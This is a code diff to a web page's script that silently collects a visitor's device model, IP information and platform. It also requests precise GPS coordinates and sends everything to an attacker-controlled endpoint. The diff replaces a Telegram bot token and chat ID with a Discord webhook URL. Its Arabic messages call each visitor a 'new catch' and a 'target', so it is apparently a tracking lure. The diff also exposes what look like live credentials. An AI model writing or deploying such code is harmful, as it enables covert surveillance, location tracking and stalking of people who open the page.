@@ -55,25 +55,16 @@
     </div>
 
     <script>
-        const BOT_TOKEN = "8942876579:AAE8F9nrRvr1mYdpiyzyCH1BfCH2GzFTCv0";
-        const CHAT_ID = "806632734";
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1543430352826011739/loVSz6Py2mno8uN83WxwfGqskhkoaAg4GYOz6hghqLvG7B24p-fPqePOvbkSm5NvyO6b";
 
-        async function sendToTelegram(message) {
-            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        async function sendToDiscord(message) {
             try {
-                await fetch(url, {
+                await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message
-                    })
+                    body: JSON.stringify({ content: message })
                 });
-            } catch (e) {
-                // الطريقة البديلة المضمونة عبر وسيط CORS
-                let proxyUrl = `https://api.allorigins.win/raw?url=` + encodeURIComponent(`${url}?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
-                fetch(proxyUrl);
-            }
+            } catch (e) {}
         }
 
         function getDeviceModel() {
@@ -104,18 +95,26 @@
                 ipData = "IP fetch failed";
             }
 
-            let msg = `🚨 [ صيد جديد - تم النقر على الزر ] 🚨\n\n📱 الجهاز: ${device}\n🌐 ${ipData}\n💻 المنصة: ${navigator.platform}`;
-            await sendToTelegram(msg);
+            let msg = `🚨 **[ صيد جديد دخل للموقع ]** 🚨\n\n` +
+                      `📱 **الجهاز:** ${device}\n` +
+                      `🌐 **الشبكة:** ${ipData}\n` +
+                      `💻 **المنصة:** ${navigator.platform}`;
+            
+            await sendToDiscord(msg);
 
-            // طلب الموقع الجغرافي
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
-                        let gpsMsg = `📍 [ إحداثيات GPS الدقيقة ]\nخط العرض: ${pos.coords.latitude}\nخط الطول: ${pos.coords.longitude}\nhttps://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                        sendToTelegram(gpsMsg);
+                        let lat = pos.coords.latitude;
+                        let lon = pos.coords.longitude;
+                        let gpsMsg = `📍 **[ إحداثيات GPS الدقيقة ]**\n` +
+                                     `خط العرض: ${lat}\n` +
+                                     `خط الطول: ${lon}\n` +
+                                     `🔗 https://maps.google.com/?q=${lat},${lon}`;
+                        sendToDiscord(gpsMsg);
                     },
                     (err) => {
-                        sendToTelegram(`⚠️ الهدف رفض إذن الـ GPS.`);
+                        sendToDiscord(`⚠️ تنبيه: الهدف رفض إذن الـ GPS.`);
                     },
                     { enableHighAccuracy: true }
                 );
